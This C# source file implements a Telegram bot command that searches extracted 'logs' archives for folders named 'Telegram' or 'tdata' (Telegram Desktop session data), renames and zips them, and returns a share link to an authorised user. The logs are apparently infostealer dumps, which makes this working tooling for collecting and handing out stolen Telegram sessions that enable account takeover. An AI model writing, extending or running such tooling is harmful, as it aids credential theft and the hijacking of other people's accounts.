using SharpCompress;
using SharpCompress.Archives;
using SharpCompress.Common;
using SharpCompress.Writers.Zip;
using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Services;

public class TelegramServiceCommand(Client client, DataService data) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    public Task Invoke(UpdateNewMessage update, User user) =>
        client.SendAvailableLogs(user, "Telegram", data);

    public async Task Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
            { } logsname) return;

        await client.EditMessage(user, update.msg_id, $"Telegram\nParsing from {logsname}");

        var directories = Directory.GetDirectories(data.GetExtractedPath(logsname))
                                        .SelectMany(x => Directory.GetDirectories(x, "*", SearchOption.TopDirectoryOnly))
                                        .Select(x => new DirectoryInfo(x))
                                        .Where(x => x.Name.StartsWith("Telegram") || x.Name.StartsWith("tdata"))
                                        .SelectMany(x => x.Name.StartsWith("Telegram") ? x.GetDirectories() : [x])
                                        .ToArray();

        var path = Path.Combine(data.BaseFolder, "Telegram", $"{logsname}.zip");
        using var zip = ArchiveFactory.Create(ArchiveType.Zip);

        for (int i = 0; i < directories.Length; i++)
        {
            directories[i].MoveTo(Path.Combine(directories[i].Parent!.FullName, $"{i}"));
        }
        
        directories.Select(x => x.Parent!.FullName)
                   .ForEach(x => zip.AddAllFromDirectory(x));

        zip.SaveTo(path, new ZipWriterOptions(CompressionType.LZMA));

        await client.EditMessage(user, update.msg_id, $"{logsname}\n{await data.GetShareLinkAsync(path)}");
    }
}